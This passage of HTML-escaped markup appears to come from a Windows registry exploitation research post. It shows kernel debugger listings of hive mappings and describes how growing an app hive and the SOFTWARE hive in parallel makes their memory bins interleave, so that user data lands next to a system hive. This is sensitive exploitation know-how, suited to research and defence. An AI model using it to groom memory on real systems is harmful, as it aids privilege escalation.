 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa4145460 &amp;nbsp;6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed150 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed34f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\DRIVERS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa412a520 &amp;nbsp;4 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed350 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed44f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\System32\config\DRIVERS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa412c5a0 &amp;nbsp;6 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed450 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed64f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Users\user\AppData\Local\Microsoft\Windows\UsrClass.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa4e8bf60 &amp;nbsp;5 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed650 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;152ed84f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 0 Mapped &amp;nbsp; &amp;nbsp; &amp;nbsp; READONLY &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; \Windows\appcompat\Programs\Amcache.hve&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In the listing above, the &amp;quot;Start&amp;quot; and &amp;quot;End&amp;quot; columns show the starting and ending addresses of each mapping divided by the page size, which is 4 KiB. In practice, this means that the SAM hive is mapped at 0x152e7a20000 &amp;ndash; 0x152e7a2ffff, the DEFAULT hive is mapped at 0x152e7a30000 &amp;ndash; 0x152e7b2ffff, and so on.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We can immediately see that all the hives are located very close to each other, with practically no gaps in between them.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c36 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;However, this example does not directly demonstrate whether it&amp;#39;s possible to place, for instance, the mapping of the SOFTWARE hive directly after the mapping of an app hive loaded by a normal user.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The addresses of the system hives appear to be already determined, and there isn&amp;#39;t much space between them to inject our own data.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Fortunately, hives can grow dynamically, especially when you start writing long values to them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This leads to the creation of new bins and mapping them at new addresses in the Registry process&amp;#39;s memory.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;For testing purposes, I wrote a simple program that creates consecutive values of 0x3FD8 bytes within a given key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This triggers the allocation of new bins of exactly 0x4000 bytes: &lt;/span&gt;&lt;span&gt;0x3FD8 bytes of data plus &lt;/span&gt;&lt;span&gt;0x20 bytes for the _HBIN structure, 4 bytes for the cell size, and 4 bytes for padding.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Next, &lt;/span&gt;&lt;span&gt;I ran two instances of it in parallel on an app hive and HKLM\SOFTWARE, filling the former with the letter &amp;quot;A&amp;quot; and the latter with the letter &amp;quot;B&amp;quot;. The result of the test was immediately visible in the memory layout&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;!vad&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;VAD&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Level&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Commit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b44c0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152801ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b5b40&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280200&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152803ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Users\user\Desktop\test.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b46a0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280400&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152805ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b6540&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280600&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152807ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Users\user\Desktop\test.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b5dc0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280800&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152809ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b4560&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280a00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280bff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Users\user\Desktop\test.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b6900&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280c00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280dff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b5280&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280e00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15280fff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Users\user\Desktop\test.dat&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b5e60&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15281000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152811ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Windows\System32\config\SOFTWARE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;ffffa58fa67b7800&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;15281200&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;152813ff&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;Mapped&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;READONLY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c5 ormwWEjHLs-c2&quot;&gt;\Users\user\Desktop\test.dat&lt;/span&gt;&lt;/p&gt;
